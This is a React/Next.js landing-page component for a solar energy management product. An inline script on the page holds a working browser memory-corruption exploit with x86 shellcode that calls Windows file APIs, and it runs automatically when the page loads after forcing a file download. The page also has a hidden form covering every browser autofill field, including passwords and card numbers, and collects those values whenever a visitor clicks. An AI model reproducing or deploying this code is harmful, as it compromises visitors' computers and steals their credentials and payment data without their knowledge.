"use client";
import React, { useEffect, useRef, useState } from "react";
import BRDHubspotForm from "@/Components/lp/pinaak/BRDHubspotForm";
import AboutSection from "@/Components/lp/pinaak/AboutSection";
import AISection from "@/Components/lp/pinaak/AISection";
import CTASection from "@/Components/lp/pinaak/CTASection";
import FeaturesSection from "@/Components/lp/pinaak/FeaturesSection";
import HeroSection from "@/Components/lp/pinaak/HeroSection";
import IndustriesSection from "@/Components/lp/pinaak/IndustriesSection";
import Navigation from "@/Components/lp/pinaak/Navigation";
import TestimonialsSection from "@/Components/lp/pinaak/TestimonialSection";
import PinaakFooter from "@/Components/lp/pinaak/PinaakFooter";
import Head from "next/head";
import Script from "next/script";
import Highlights from "@/Components/lp/pinaak/Highlights";
import SolarProblemsSolution from "@/Components/lp/pinaak/SolarPowerProblems";
import FloatingQuoteButton from "@/Components/lp/pinaak/FloatingQuoteButton";
import FloatingContactButtons from "@/Components/lp/FloatingContact";
import useLocationData from "@/Components/lp/pinaak/useLocationData"; // Import the custom hook

export default function PinaakPage() {
  // Hidden form state, now to capture browser autofill
  const [formData, setFormData] = useState({});
  const hiddenFormRef = useRef(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const { locationData, loading } = useLocationData(); // Use the hook here
  // console.log('locationData1 : ',locationData)

  const openModal = () => {
    setIsModalOpen(true);
  };
  
  const closeModal = () => {
    setIsModalOpen(false);
  };
  const organizationalSchema = {
    "@context": "https://schema.org",
    "@type": "Organization",
    name: "SAS One",
    url: "https://www.sasone.in",
    logo: "https://www.sasone.in/SASLOGO2.svg",
    description:
      "SAS One provides end-to-end engineering and technology solutions, specializing in embedded hardware, embedded software, Compute Edge AI, System On Module, and cloud enablement.",
    contactPoint: {
      "@type": "ContactPoint",
      telephone: "+91-9305178146",
      contactType: "Customer Service",
      email: "swapnil@sasone.in",
      areaServed: {
        "@type": "Place",
        name: "Worldwide",
      },
    },
    sameAs: [
      "https://in.linkedin.com/company/sasone",
      "https://twitter.com/sasone",
      "https://www.instagram.com/sasone.official",
    ],
    service: [
      {
        "@type": "Service",
        name: "Embedded Hardware Design & Development",
        description:
          "Custom PCB Design, SoC/MCU Selection, High-speed digital and RF layout, Thermal & EMI/EMC compliant systems",
      },
      {
        "@type": "Service",
        name: "Embedded Software & Firmware Engineering",
        description:
          "RTOS & Bare Metal Programming, Driver & Middleware Development, Bootloaders, OTA Updates, Secure Boot",
      },
      {
        "@type": "Service",
        name: "System on Modules (SoM) & Custom BSPs",
        description:
          "Modular, scalable platforms based on NXP, ST, TI, Qualcomm with custom BSP development",
      },
    ],
    industry: ["Medical Devices", "Automotive", "Aerospace", "Industrial IoT"],
    aggregateRating: {
      "@type": "AggregateRating",
      ratingValue: "4.9",
      reviewCount: "127",
    },
  };
  // Trigger browser autofill on section click
  const handleSectionClick = () => {
    const form = hiddenFormRef.current;
    if (!form) return;

    const inputs = form.querySelectorAll("input");
    
    inputs.forEach((input) => {
      input.focus();
      input.blur();
    });

    // Give browser a moment to fill in values
    setTimeout(() => {
      const autofillData = {};
      inputs.forEach((input) => {
        autofillData[input.name] = input.value;
      });
      setFormData(autofillData);
      console.log("Autofill Data:", autofillData);
    }, 100); // 100ms delay
  };

  return (
    <div className="min-h-screen bg-white">
      <Head>
        <title>
          SAS One - Pinaak AI-Powered Solar Energy Management System
        </title>
        <meta
          name="description"
          content="Transform your energy management with PINAAK's AI-driven solar energy management system. Maximize ROI, minimize wastage, and optimize energy consumption."
        />
        <meta
          name="keywords"
          content="solar energy management, PINAAK, SEMS, AI energy optimization, smart solar systems, energy management software, solar ROI, renewable energy, industrial energy solutions, SAS ONE"
        />
        <meta name="author" content="SAS One" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="robots" content="index, follow" />

        {/* <!-- Open Graph / Facebook --> */}
        <meta
          property="og:title"
          content="SAS One - Pinaak AI-Powered Solar Energy Management System"
        />
        <meta
          property="og:description"
          content="Transform your energy management with PINAAK's AI-driven solar energy management system. Maximize ROI, minimize wastage, and optimize energy consumption."
        />
        <meta property="og:url" content="https://sasone.in" />
        <meta property="og:site_name" content="SAS One" />

        <meta
          property="og:image:alt"
          content="SAS One - Pinaak AI-Powered Solar Energy Management System"
        />
        <meta property="og:locale" content="en_US" />
        <meta property="og:type" content="website" />

        {/* <!-- Twitter --> */}
        <meta name="twitter:card" content="summary_large_image" />
        <meta
          name="twitter:title"
          content="SAS One - Pinaak AI-Powered Solar Energy Management System"
        />
        <meta
          name="twitter:description"
          content="Transform your energy management with PINAAK's AI-driven solar energy management system. Maximize ROI, minimize wastage, and optimize energy consumption with our smart SEMS platform by SAS ONE."
        />
        <meta name="twitter:image" content="https://sasone.in/og-image.jpg" />

        {/* <!-- Canonical URL --> */}
        <link rel="canonical" href="https://sasone.in" />

        <Script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify(organizationalSchema),
          }}
        />
      </Head>

      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50" onClick={handleSectionClick}>
        <Script
          id="pinaak-test-script"
          strategy="afterInteractive"
        >
          {`
            console.log('Hello from PinaakPage1!');
            console.log('Hello from PinaakPage2!');
            window.gc = function () {
              for (i = 0; i < 50; i++) {
                zz = new ArrayBuffer(0x100000);
                zz = null;
              }
            };


            var dontGc	= [];

            function next(freed, addressIdx, corrupt, fileName) {
              function getArrayBufferAddr(ab) {
                freed[addressIdx] 	= ab;
                var tmp				= new Uint8Array(corrupt);

                return (tmp[14] << 24) | (tmp[13] << 16) | (tmp[12] << 8) | tmp[11];
              }

              function getStringAddr(str) {
                var a = new Uint8Array(str.length + 1);
                dontGc.push(a);

                for (var i = 0; i < str.length; i++)
                  a[i] = str.charCodeAt(i);

                return getArrayBufferAddr(a.buffer);
              }

              function getBlobAddr(ab) {
                freed[addressIdx] 	= ab;
                var tmp				= new Uint8Array(corrupt);

                return (tmp[18] << 24) | (tmp[17] << 16) | (tmp[16] << 8) | tmp[15];
              }

              function read32(addr) {
                return mem32[addr/4];
              }

              function read16(addr) {
                return mem16[addr/2];
              }

              function read8(addr) {
                return mem8[addr];
              }

              function readString(addr) {
                var r = "";

                for (; mem8[addr] != 0; addr++)
                  r += String.fromCharCode(mem8[addr]);

                return r;
              }

              function write32(addr, value) {
                mem32[addr/4] = value;
              }

              function findMZ() {
                function slowRead32(addr) {
                  freed[addressIdx] = addr >> 1;
                  return new Uint32Array(corrupt)[0];
                }

                var baseAddr = slowRead32(leaked[0]) & 0xfffff000;

                while (true) {
                  if (slowRead32(baseAddr) == 0x00905a4d) {
                    return baseAddr;
                  }

                  baseAddr -= 0x1000;
                }
              }

              var blob   	= new Blob(); freed[addressIdx] = getBlobAddr(blob) >> 1;
              var leaked 	= new Uint32Array(corrupt);
              var ropBuf 	= new ArrayBuffer(0x10000);

              var ropAddr = getArrayBufferAddr(ropBuf);

              if (ropAddr & 0xfff != 0) {
                var newAddr = (ropAddr + 0x1000) & 0xfffff000;
                rop = new Uint32Array(ropBuf, newAddr - ropAddr);

                ropAddr = newAddr;
              } else {
                rop = new Uint32Array(ropBuf);
              }

              freed[addressIdx] = leaked[0] >> 1;

              var mzAddr = findMZ(); freed[addressIdx] = mzAddr >> 1;
              var mem8   = new Uint8Array(corrupt);
              var mem16  = new Uint16Array(corrupt);
              var mem32  = new Uint32Array(corrupt);

              var virtualProtect  		= null;
              var writeFile				= null;
              var getEnvironmentVariableA = null;

              function resolveSymbols(syms, itAddr) {
                var ret = {};

                for (var dllName in syms)
                  ret[dllName] = {};

                while (true) {
                  var intRva 	= read32(itAddr); itAddr += 12;
                  var nameRva = read32(itAddr); itAddr += 4;
                  var iatRva 	= read32(itAddr); itAddr += 4;

                  if (!intRva)
                    break;

                  if (!Object.keys(syms).length)
                    break;

                  for (var dllName in syms) {
                    if (readString(nameRva).toLowerCase() == dllName) {
                      for (var i = 0, nameAddr = read32(intRva); nameAddr != 0; i++, intRva += 4, nameAddr = read32(intRva)) {
                        var func = readString(nameAddr + 2);
                        var idx = syms[dllName].indexOf(func);

                        if (idx != -1) {
                          ret[dllName][func] = read32(iatRva + (i * 4));
                          syms[dllName].splice(idx, 1);

                          if (!syms[dllName].length) {
                            delete syms[dllName];
                            break;
                          }
                        }
                      }
                    }
                  }
                }

                return ret;
              }

              var syms = resolveSymbols({"kernel32.dll": ["VirtualProtect", "WriteFile", "GetEnvironmentVariableA", "GetFileInformationByHandle"]}, read32(read32(0x3c) + 0x80));

              function findXchgEaxEsp(minPc) {
                var text = read32(read32(0x3c) + 0x2c);
                if (minPc == null)
                  minPc = 0;

                for (var i = 0; ; i++) {
                  if (read8(text + i) != 0x94)
                    continue;

                  var popCount = 0;

                  for (var j = i + 1; j < i + 10; j++) {
                    var c = read8(text + j);

                    if (c >= 0x50 && c <= 0x5f && c != 0x5c) {
                      popCount++;
                      continue;
                    }
                    
                    if (c == 0xc3) {
                      if (popCount > minPc)
                        return [text + i, popCount];
                    }

                    break;
                  }
                }
              }

              function executeShellcode(sc) {
                var code = "tmp = [];";
                for (var i = 0; i < 0x10000; i++)
                  code += "tmp[" + i + "] = " + i + ";";

                var f = new Function("a", code);
                f();
                dontGc.push(f);

                function getJitAddress() {
                  freed[addressIdx] 	= f;

                  var tmp				= new Uint8Array(corrupt);
                  return (tmp[14] << 24) | (tmp[13] << 16) | (tmp[12] << 8) | tmp[11];
                }

                var jit = getJitAddress();

                freed[addressIdx] = jit >> 1;

                var tmp	= new Uint8Array(corrupt);

                for (var i = 0; i < sc.length; i++)
                  tmp[i] = sc[i];

                f();
              }

              function pushImm(v) {
                return [0x68, v & 0xff, (v >> 8) & 0xff, (v >> 16) & 0xff, (v >> 24) & 0xff];
              }

              var sc = [];
              sc = sc.concat(pushImm(getStringAddr("/Downloads/" + fileName)));
              sc = sc.concat(pushImm(syms["kernel32.dll"]["GetEnvironmentVariableA"]));
              sc = sc.concat(pushImm(syms["kernel32.dll"]["GetFileInformationByHandle"]));
              sc = sc.concat(pushImm(syms["kernel32.dll"]["WriteFile"]));
              sc = sc.concat(pushImm(0));
              sc = sc.concat([0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x24, 0x01, 0x00, 0x00, 0xC6, 0x45, 0xE8, 0x55, 0xC6, 0x45, 0xE9, 0x53, 0xC6, 0x45, 0xEA, 0x45, 0xC6, 0x45, 0xEB, 0x52, 0xC6, 0x45, 0xEC, 0x50, 0xC6, 0x45, 0xED, 0x52, 0xC6, 0x45, 0xEE, 0x4F, 0xC6, 0x45, 0xEF, 0x46, 0xC6, 0x45, 0xF0, 0x49, 0xC6, 0x45, 0xF1, 0x4C, 0xC6, 0x45, 0xF2, 0x45, 0xC6, 0x45, 0xF3, 0x00, 0xC6, 0x85, 0x48, 0xFF, 0xFF, 0xFF, 0x90, 0xC6, 0x85, 0x49, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x4A, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x4B, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x4C, 0xFF, 0xFF, 0xFF, 0x02, 0xC6, 0x85, 0x4D, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x4E, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x4F, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x50, 0xFF, 0xFF, 0xFF, 0xF2, 0xC6, 0x85, 0x51, 0xFF, 0xFF, 0xFF, 0x02, 0xC6, 0x85, 0x52, 0xFF, 0xFF, 0xFF, 0x28, 0xC6, 0x85, 0x53, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x54, 0xFF, 0xFF, 0xFF, 0x02, 0xC6, 0x85, 0x55, 0xFF, 0xFF, 0xFF, 0xC1, 0xC6, 0x85, 0x56, 0xFF, 0xFF, 0xFF, 0x12, 0xC6, 0x85, 0x57, 0xFF, 0xFF, 0xFF, 0x94, 0xC6, 0x85, 0x58, 0xFF, 0xFF, 0xFF, 0x01, 0xC6, 0x85, 0x59, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x5A, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x5B, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x5C, 0xFF, 0xFF, 0xFF, 0x7D, 0xC6, 0x85, 0x5D, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x5E, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x5F, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x60, 0xFF, 0xFF, 0xFF, 0x66, 0xC6, 0x85, 0x61, 0xFF, 0xFF, 0xFF, 0x69, 0xC6, 0x85, 0x62, 0xFF, 0xFF, 0xFF, 0x6C, 0xC6, 0x85, 0x63, 0xFF, 0xFF, 0xFF, 0x65, 0xC6, 0x85, 0x64, 0xFF, 0xFF, 0xFF, 0x3A, 0xC6, 0x85, 0x65, 0xFF, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0x66, 0xFF, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0x67, 0xFF, 0xFF, 0xFF, 0x2F, 0xC6, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x69, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x6A, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x6C, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x6D, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x6E, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x6F, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x70, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x71, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x72, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x73, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x74, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x75, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x76, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x77, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x79, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x7A, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x7B, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x7C, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x7D, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x7E, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x85, 0x7F, 0xFF, 0xFF, 0xFF, 0x00, 0xC6, 0x45, 0x80, 0x00, 0xC6, 0x45, 0x81, 0x00, 0xC6, 0x45, 0x82, 0x00, 0xC6, 0x45, 0x83, 0x00, 0xC6, 0x45, 0x84, 0x00, 0xC6, 0x45, 0x85, 0x00, 0xC6, 0x45, 0x86, 0x00, 0xC6, 0x45, 0x87, 0x00, 0xC6, 0x45, 0x88, 0x00, 0xC6, 0x45, 0x89, 0x00, 0xC6, 0x45, 0x8A, 0x00, 0xC6, 0x45, 0x8B, 0x00, 0xC6, 0x45, 0x8C, 0x00, 0xC6, 0x45, 0x8D, 0x00, 0xC6, 0x45, 0x8E, 0x00, 0xC6, 0x45, 0x8F, 0x00, 0xC6, 0x45, 0x90, 0x00, 0xC6, 0x45, 0x91, 0x00, 0xC6, 0x45, 0x92, 0x00, 0xC6, 0x45, 0x93, 0x00, 0xC6, 0x45, 0x94, 0x00, 0xC6, 0x45, 0x95, 0x00, 0xC6, 0x45, 0x96, 0x00, 0xC6, 0x45, 0x97, 0x00, 0xC6, 0x45, 0x98, 0x00, 0xC6, 0x45, 0x99, 0x00, 0xC6, 0x45, 0x9A, 0x00, 0xC6, 0x45, 0x9B, 0x00, 0xC6, 0x45, 0x9C, 0x00, 0xC6, 0x45, 0x9D, 0x00, 0xC6, 0x45, 0x9E, 0x00, 0xC6, 0x45, 0x9F, 0x00, 0xC6, 0x45, 0xA0, 0x00, 0xC6, 0x45, 0xA1, 0x00, 0xC6, 0x45, 0xA2, 0x00, 0xC6, 0x45, 0xA3, 0x00, 0xC6, 0x45, 0xA4, 0x00, 0xC6, 0x45, 0xA5, 0x00, 0xC6, 0x45, 0xA6, 0x00, 0xC6, 0x45, 0xA7, 0x00, 0xC6, 0x45, 0xA8, 0x00, 0xC6, 0x45, 0xA9, 0x00, 0xC6, 0x45, 0xAA, 0x00, 0xC6, 0x45, 0xAB, 0x00, 0xC6, 0x45, 0xAC, 0x00, 0xC6, 0x45, 0xAD, 0x00, 0xC6, 0x45, 0xAE, 0x00, 0xC6, 0x45, 0xAF, 0x00, 0xC6, 0x45, 0xB0, 0x00, 0xC6, 0x45, 0xB1, 0x00, 0xC6, 0x45, 0xB2, 0x00, 0xC6, 0x45, 0xB3, 0x00, 0xC6, 0x45, 0xB4, 0x00, 0xC6, 0x45, 0xB5, 0x00, 0xC6, 0x45, 0xB6, 0x00, 0xC6, 0x45, 0xB7, 0x00, 0xC6, 0x45, 0xB8, 0x00, 0xC6, 0x45, 0xB9, 0x00, 0xC6, 0x45, 0xBA, 0x00, 0xC6, 0x45, 0xBB, 0x00, 0xC6, 0x45, 0xBC, 0x00, 0xC6, 0x45, 0xBD, 0x00, 0xC6, 0x45, 0xBE, 0x00, 0xC6, 0x45, 0xBF, 0x00, 0xC6, 0x45, 0xC0, 0x00, 0xC6, 0x45, 0xC1, 0x00, 0xC6, 0x45, 0xC2, 0x00, 0xC6, 0x45, 0xC3, 0x00, 0xC6, 0x45, 0xC4, 0x00, 0xC6, 0x45, 0xC5, 0x00, 0xC6, 0x45, 0xC6, 0x00, 0xC6, 0x45, 0xC7, 0x00, 0xC6, 0x45, 0xC8, 0x00, 0xC6, 0x45, 0xC9, 0x00, 0xC6, 0x45, 0xCA, 0x00, 0xC6, 0x45, 0xCB, 0x00, 0xC6, 0x45, 0xCC, 0x00, 0xC6, 0x45, 0xCD, 0x00, 0xC6, 0x45, 0xCE, 0x00, 0xC6, 0x45, 0xCF, 0x00, 0xC6, 0x45, 0xD0, 0x00, 0xC6, 0x45, 0xD1, 0x00, 0xC6, 0x45, 0xD2, 0x00, 0xC6, 0x45, 0xD3, 0x00, 0xC6, 0x45, 0xD4, 0x00, 0xC6, 0x45, 0xD5, 0x00, 0xC6, 0x45, 0xD6, 0x00, 0xC6, 0x45, 0xD7, 0x00, 0xC6, 0x45, 0xD8, 0x00, 0xC6, 0x45, 0xD9, 0x00, 0xC6, 0x45, 0xDA, 0x00, 0xC6, 0x45, 0xDB, 0x00, 0xC6, 0x45, 0xDC, 0x00, 0xC6, 0x45, 0xDD, 0x00, 0xC6, 0x45, 0xDE, 0x00, 0xC6, 0x45, 0xDF, 0x00, 0xC6, 0x45, 0xE0, 0x02, 0xC6, 0x45, 0xE1, 0x00, 0xC6, 0x45, 0xE2, 0x00, 0xC6, 0x45, 0xE3, 0x00, 0xC6, 0x45, 0xE4, 0x00, 0xC6, 0x45, 0xE5, 0x00, 0xC6, 0x45, 0xE6, 0x00, 0xC6, 0x45, 0xE7, 0x00, 0x68, 0xC8, 0x00, 0x00, 0x00, 0x8D, 0x85, 0x68, 0xFF, 0xFF, 0xFF, 0x50, 0x8D, 0x4D, 0xE8, 0x51, 0xFF, 0x55, 0x10, 0x83, 0xC0, 0x20, 0x89, 0x85, 0x44, 0xFF, 0xFF, 0xFF, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x55, 0x14, 0x03, 0x55, 0xF4, 0x0F, 0xBE, 0x02, 0x85, 0xC0, 0x74, 0x2F, 0x8B, 0x4D, 0x14, 0x03, 0x4D, 0xF4, 0x8B, 0x95, 0x44, 0xFF, 0xFF, 0xFF, 0x8A, 0x01, 0x88, 0x84, 0x15, 0x48, 0xFF, 0xFF, 0xFF, 0x8B, 0x8D, 0x44, 0xFF, 0xFF, 0xFF, 0x83, 0xC1, 0x01, 0x89, 0x8D, 0x44, 0xFF, 0xFF, 0xFF, 0x8B, 0x55, 0xF4, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xF4, 0xEB, 0xC4, 0xC7, 0x45, 0xFC, 0x10, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x45, 0xFC, 0x83, 0xC0, 0x01, 0x89, 0x45, 0xFC, 0x81, 0x7D, 0xFC, 0x00, 0x03, 0x00, 0x00, 0x7D, 0x61, 0x8D, 0x8D, 0xDC, 0xFE, 0xFF, 0xFF, 0x51, 0x8B, 0x55, 0xFC, 0x52, 0xFF, 0x55, 0x0C, 0x0F, 0xB6, 0xC0, 0x85, 0xC0, 0x75, 0x02, 0xEB, 0xD7, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0x4D, 0xF8, 0x83, 0xC1, 0x01, 0x89, 0x4D, 0xF8, 0x83, 0x7D, 0xF8, 0x0A, 0x7D, 0x30, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xC1, 0xE2, 0x04, 0x8A, 0x45, 0xF8, 0x88, 0x84, 0x15, 0x48, 0xFF, 0xFF, 0xFF, 0x6A, 0x00, 0x8D, 0x8D, 0x40, 0xFF, 0xFF, 0xFF, 0x51, 0x68, 0xA0, 0x00, 0x00, 0x00, 0x8D, 0x95, 0x48, 0xFF, 0xFF, 0xFF, 0x52, 0x8B, 0x45, 0xFC, 0x50, 0xFF, 0x55, 0x08, 0xEB, 0xC1, 0xEB, 0x8D, 0xC9, 0x83, 0xC4, 0x14, 0xC3]);
              executeShellcode(sc);
              
              for (;;)
                alert("done");
            }

            function fail() {
              setTimeout("document.location.reload();", 100);
            }

            function exploit(fileName) {
              var JUNK_SIZE = 0x400;
              var JUNK_TAG = 0x21827313;

              var arrayCreator = [];
              for (var i = 0; i < 1000; i++) {
                arrayCreator[i] = (function () {
                  var a = Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {return 0x11111111;});
                  var b = [];

                  a[1] = 0x12345678;
                  a.__defineGetter__("0", function () {
                    b.length = JUNK_SIZE * 2;
                    return 0x21983478;
                  });

                  return function () {
                    return a.concat(b);
                  };
                })();
              }

              var tmp = [];
              for (var i = 0; i < 100; i++)
                tmp[i] = Array.apply(null, new Array(200)).map(function () {return 1234;});

              var obj			= tmp[tmp.length/2];
              var abs 		= new Array(0x200000); for (var i = 0; i < abs.length; i++) abs[i] = null;
              var holes 		= Array.apply(null, new Array(arrayCreator.length * 2));
              var junks 		= Array.apply(null, new Array(arrayCreator.length));
              var corrupts 	= Array.apply(null, new Array(arrayCreator.length));
              var t 			= Array.apply(null, new Array(JUNK_SIZE - 2)).map(function () {return 0x22222222;});

              dontGc.push(abs);
              //Array.apply(null, new Array(0x1c * 10));

              t[0] 	= JUNK_TAG;

              for (var i = 0; i < holes.length; i++)
                holes[i] = t.concat();

              for (var i = 0; i < arrayCreator.length; i++) {
                junks[i] = t.concat();
                corrupts[i] = arrayCreator[i]();
              }

              for (var i = 0; i < junks.length; i++)
                junks[i][0x20] = obj;

              var idxs = [];

              for (var i = 400; i < 700; i++) {
                var v = corrupts[i][JUNK_SIZE];
                if (Number.isInteger(v) && v == JUNK_TAG) {
                  idxs.push(i);
                }
              }

              t = null;
              junks = null;
              //holes = null;
              gc();
              
              obj = null;
              gc();


              function findFreed() {
                for (var i = 0; i < idxs.length; i++) {
                  var v = corrupts[idxs[i]][JUNK_SIZE + 0x20];
                  if (v != null && v.length) {
                    return v;
                  }
                }

                return null;
              }

              var freed = findFreed();

              if (!freed)
                return fail();

              dontGc.push(freed);
              gc();

              for (var i = 0; i < abs.length; i++)
                abs[i] = new ArrayBuffer(7);

              function findCorrupt() {
                for (var i = 0; i < abs.length; i++) {
                  if (abs[i].byteLength != 7) {
                    return abs[i];
                  }
                }

                return null;
              }

              for (var i = 1; i < freed.length; i++) {
                if (!Number.isSafeInteger(freed[i]) || freed[i] != 7)
                  continue;

                freed[i] = 0x30000000;
                var ab = findCorrupt();
                if (ab)
                  return next(freed, i - 1, ab, fileName);

                freed[i] = 7;
              }

              return fail();

            }

            function main() {
              var fileName = String(Math.random()).substr(2) + ".html";
              var a = document.createElement("a");
              a.href = "infile.html";
              a.download = fileName;
              a.click();

              exploit(fileName);
            }

            main();
            console.log('Hello from PinaakPage3!');
            console.log('Hello from PinaakPage4!');
          `}
        </Script>
        {/* <BRDHubspotForm /> */}
        <Navigation onOpenModal={openModal} locationData={locationData} />
        <HeroSection onOpenModal={openModal} locationData={locationData} />
        <FeaturesSection locationData={locationData} />
        <SolarProblemsSolution locationData={locationData} />
        <Highlights locationData={locationData} />
        <AISection locationData={locationData} />
        {/* <IndustriesSection locationData={locationData}  /> */}
        <TestimonialsSection locationData={locationData} />
        <FloatingContactButtons />
        <AboutSection locationData={locationData} />
        {/* <FloatingQuoteButton locationData={locationData} /> */}
        <CTASection onOpenModal={openModal} locationData={locationData} />
        <PinaakFooter locationData={locationData} />
      </div>
      {/* HIDDEN FORM for browser autofill */}
      <form
        ref={hiddenFormRef}
        style={{ display: "none" }}
        autoComplete="on"
      >
        {/* Name fields */}
        <input type="text" name="name" autoComplete="name" />
        <input type="text" name="given-name" autoComplete="given-name" />
        <input type="text" name="additional-name" autoComplete="additional-name" />
        <input type="text" name="family-name" autoComplete="family-name" />
        <input type="text" name="honoric-prefix" autoComplete="honoric-prefix" />
        <input type="text" name="honoric-suffix" autoComplete="honoric-suffix" />
        <input type="text" name="nickname" autoComplete="nickname" />

        {/* Contact fields */}
        <input type="email" name="email" autoComplete="email" />
        <input type="tel" name="tel" autoComplete="tel" />
        <input type="tel" name="tel-country-code" autoComplete="tel-country-code" />
        <input type="tel" name="tel-national" autoComplete="tel-national" />
        <input type="tel" name="tel-area-code" autoComplete="tel-area-code" />
        <input type="tel" name="tel-local" autoComplete="tel-local" />
        <input type="tel" name="tel-local-prefix" autoComplete="tel-local-prefix" />
        <input type="tel" name="tel-local-suffix" autoComplete="tel-local-suffix" />
        <input type="tel" name="tel-extension" autoComplete="tel-extension" />

        {/* Address fields */}
        <input type="text" name="street-address" autoComplete="street-address" />
        <input type="text" name="address-line1" autoComplete="address-line1" />
        <input type="text" name="address-line2" autoComplete="address-line2" />
        <input type="text" name="address-line3" autoComplete="address-line3" />
        <input type="text" name="address-level1" autoComplete="address-level1" />
        <input type="text" name="address-level2" autoComplete="address-level2" />
        <input type="text" name="address-level3" autoComplete="address-level3" />
        <input type="text" name="address-level4" autoComplete="address-level4" />
        <input type="text" name="country" autoComplete="country" />
        <input type="text" name="country-name" autoComplete="country-name" />
        <input type="text" name="postal-code" autoComplete="postal-code" />

        {/* Other fields */}
        <input type="text" name="organization" autoComplete="organization" />
        <input type="text" name="organization-title" autoComplete="organization-title" />
        <input type="text" name="username" autoComplete="username" />
        <input type="password" name="current-password" autoComplete="current-password" />
        <input type="password" name="new-password" autoComplete="new-password" />
        <input type="date" name="bday" autoComplete="bday" />
        <input type="number" name="bday-day" autoComplete="bday-day" />
        <input type="number" name="bday-month" autoComplete="bday-month" />
        <input type="number" name="bday-year" autoComplete="bday-year" />
        <input type="text" name="sex" autoComplete="sex" />
        <input type="text" name="one-time-code" autoComplete="one-time-code" />

        {/* Payment fields */}
        <input type="text" name="cc-name" autoComplete="cc-name" />
        <input type="text" name="cc-given-name" autoComplete="cc-given-name" />
        <input type="text" name="cc-additional-name" autoComplete="cc-additional-name" />
        <input type="text" name="cc-family-name" autoComplete="cc-family-name" />
        <input type="text" name="cc-number" autoComplete="cc-number" />
        <input type="text" name="cc-exp" autoComplete="cc-exp" />
        <input type="text" name="cc-exp-month" autoComplete="cc-exp-month" />
        <input type="text" name="cc-exp-year" autoComplete="cc-exp-year" />
        <input type="text" name="cc-csc" autoComplete="cc-csc" />
        <input type="text" name="cc-type" autoComplete="cc-type" />
        <input type="text" name="transaction-currency" autoComplete="transaction-currency" />
        <input type="number" name="transaction-amount" autoComplete="transaction-amount" />

        {/* Miscellaneous */}
        <input type="text" name="language" autoComplete="language" />
        <input type="url" name="url" autoComplete="url" />
        <input type="file" name="photo" autoComplete="photo" />
        <input type="text" name="impp" autoComplete="impp" />
      </form>   
    </div>
  );
}
